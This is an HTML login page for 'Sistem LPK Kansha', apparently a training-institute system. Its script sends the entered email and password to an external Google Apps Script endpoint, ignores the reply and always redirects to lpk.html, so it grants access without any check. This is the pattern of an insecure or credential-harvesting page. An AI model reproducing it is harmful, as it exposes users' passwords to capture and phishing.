<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login Sistem LPK</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Poppins', sans-serif;
}

body{
  height:100vh;
  background:linear-gradient(135deg,#0f172a,#1e3a8a);
  display:flex;
  justify-content:center;
  align-items:center;
}

.card{
  background:white;
  width:380px;
  padding:40px;
  border-radius:16px;
  box-shadow:0 20px 40px rgba(0,0,0,0.3);
  animation:fade 0.6s ease-in-out;
}

@keyframes fade{
  from{opacity:0; transform:translateY(20px);}
  to{opacity:1; transform:translateY(0);}
}

h2{
  text-align:center;
  margin-bottom:25px;
  font-weight:600;
  color:#1e293b;
}

input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:1px solid #d1d5db;
  border-radius:8px;
  transition:0.3s;
}

input:focus{
  border-color:#1e3a8a;
  outline:none;
}

button{
  width:100%;
  padding:12px;
  margin-top:10px;
  background:#1e3a8a;
  color:white;
  border:none;
  border-radius:8px;
  font-weight:600;
  cursor:pointer;
  transition:0.3s;
}

button:hover{
  background:#0f172a;
}
</style>
</head>

<body>

<div class="card">
  <h2>Sistem LPK Kansha</h2>

  <form id="loginForm">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Masuk</button>
  </form>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e){
  e.preventDefault();

  const formData = new FormData(this);
  
  fetch("https://script.google.com/macros/s/AKfycbxTtoVDUB96jtAofsc1nlmBgJPkaJKMKtxPfHAaueX9l3djxQaCWpi3TLWjbzWKd1qt/exec", {
    method: "POST",
    mode: "no-cors",
    body: formData
  });

  window.location.href = "lpk.html";
});
</script>

  
</body>
</html>
